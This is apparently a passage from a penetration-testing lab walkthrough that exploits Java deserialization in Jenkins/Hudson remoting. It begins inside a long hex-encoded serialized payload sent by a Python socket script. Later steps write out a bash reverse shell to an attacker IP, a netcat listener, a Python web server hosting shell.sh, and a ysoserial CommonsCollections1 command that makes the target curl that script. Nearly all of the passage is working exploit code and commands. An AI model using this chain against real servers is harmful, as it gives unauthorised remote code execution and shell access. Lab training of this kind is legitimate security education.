x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x03\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x03\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x3c\x74\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x74\x00\x10\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x04\x63\x61\x6c\x6c\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x3c\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x70\x73\x7d\x00\x00\x00\x02\x00\x2e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x00\x1c\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x49\x52\x65\x61\x64\x52\x65\x73\x6f\x6c\x76\x65\x78\x72\x00\x17\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x72\x65\x66\x6c\x65\x63\x74\x2e\x50\x72\x6f\x78\x79\xe1\x27\xda\x20\xcc\x10\x43\xcb\x02\x00\x01\x4c\x00\x01\x68\x74\x00\x25\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x72\x65\x66\x6c\x65\x63\x74\x2f\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x3b\x78\x70\x73\x72\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x00\x00\x00\x00\x00\x00\x00\x01\x03\x00\x05\x5a\x00\x14\x61\x75\x74\x6f\x55\x6e\x65\x78\x70\x6f\x72\x74\x42\x79\x43\x61\x6c\x6c\x65\x72\x5a\x00\x09\x67\x6f\x69\x6e\x67\x48\x6f\x6d\x65\x49\x00\x03\x6f\x69\x64\x5a\x00\x09\x75\x73\x65\x72\x50\x72\x6f\x78\x79\x4c\x00\x06\x6f\x72\x69\x67\x69\x6e\x71\x00\x7e\x00\x0d\x78\x70\x00\x00\x00\x00\x00\x02\x00\x73\x71\x00\x7e\x00\x0b\x71\x00\x7e\x00\x43\x74\x00\x78\x50\x72\x6f\x78\x79\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x40\x32\x20\x77\x61\x73\x20\x63\x72\x65\x61\x74\x65\x64\x20\x66\x6f\x72\x20\x69\x6e\x74\x65\x72\x66\x61\x63\x65\x20\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x75\x71\x00\x7e\x00\x11\x00\x00\x00\x0d\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x7d\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x89\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x74\x00\x04\x77\x72\x61\x70\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x6a\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x74\x00\x06\x65\x78\x70\x6f\x72\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x02\xa6\x74\x00\x21\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x74\x00\x16\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x4a\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x46\x71\x00\x7e\x00\x1d\x71\x00\x7e\x00\x1e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x03\x08\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x22\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xfa\x71\x00\x7e\x00\x24\x71\x00\x7e\x00\x25\x71\x00\x7e\x00\x26\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x71\x00\x7e\x00\x28\x70\x71\x00\x7e\x00\x29\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x71\x00\x7e\x00\x20\x71\x00\x7e\x00\x21\x71\x00\x7e\x00\x2b\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x71\x00\x7e\x00\x30\x71\x00\x7e\x00\x31\x71\x00\x7e\x00\x32\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x34\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2d\x71\x00\x7e\x00\x2e\x71\x00\x7e\x00\x36\x71\x00\x7e\x00\x3a\x78\x78\x75\x72\x00\x02\x5b\x42\xac\xf3\x17\xf8\x06\x08\x54\xe0\x02\x00\x00\x78\x70\x00\x00\x07\x46\xac\xed\x00\x05\x73\x72\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x04\x49\x00\x03\x6f\x69\x64\x5b\x00\x09\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x4f\x62\x6a\x65\x63\x74\x3b\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x05\x74\x79\x70\x65\x73\x74\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x77\x08\xff\xff\xff\xfe\x00\x00\x00\x02\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29&#x27;
print &#x27;sending payload...&#x27;
sock.send(payload)
data = sock.recv(1024)
print(&#x27;received &quot;%s&quot;&#x27; % data)

sock.close()
</code></pre><p id="b0aac75f-4b3f-4cd3-9005-b1c0e4419c3c" class="">Step 5: Create a reverse shell payload.</p><p id="6232b819-b87e-4e0e-ab9a-502d52cacbb1" class="">Copy and paste the command into a file and save it as shell.sh.</p><p id="39e17644-2d7a-4727-8f77-eab2fd7f97e9" class="">Syntax:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68a603e6-6b7c-4d7a-8716-c9f904077b40" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">bash -i &gt;&amp; /dev/tcp/&lt;lhost&gt;/&lt;lport&gt; 0&gt;&amp;1
</code></pre><p id="289dc34b-19eb-456e-9519-ad62a505ec6c" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="91df72b8-1ebb-4311-a32f-40464bfaed58" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">bash -i &gt;&amp; /dev/tcp/192.24.161.2/9999 0&gt;&amp;1
</code></pre><p id="2521f70f-bf95-4ab3-8167-ab50c4ccbd3c" class="">Step 6: Setup a Netcat listener that will be listening for connections on port 9999.</p><p id="a6f3cf7d-48b9-447d-a6c6-970b98b72465" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f3cfa52-764a-4072-ad14-8b6489637e04" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvp 9999
</code></pre><p id="cee57ff1-ae16-4151-8e8b-2f2827893087" class="">Step 7: Host the shell.sh file using a Python SimpleHTTPServer. In the same directory where the file is present, execute the below.</p><p id="ae28f352-e06f-4e68-b923-c0765949fa0c" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="40b7070c-bb97-494a-b38f-4a90e6b93e7a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python -m SimpleHTTPServer 8888
</code></pre><p id="32fa157f-fb9a-4cc4-81b3-b45b3a9e4b60" class="">Step 8: Generate a payload with a ysoserial file and make the target machine download the shell.sh file from attacker machine.</p><p id="ad351e4a-7534-4a99-b5ea-4cba23826361" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="89a8ba7e-a490-4862-9122-d09b2229c22f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 &quot;curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh&quot; &gt; /root/payload.out
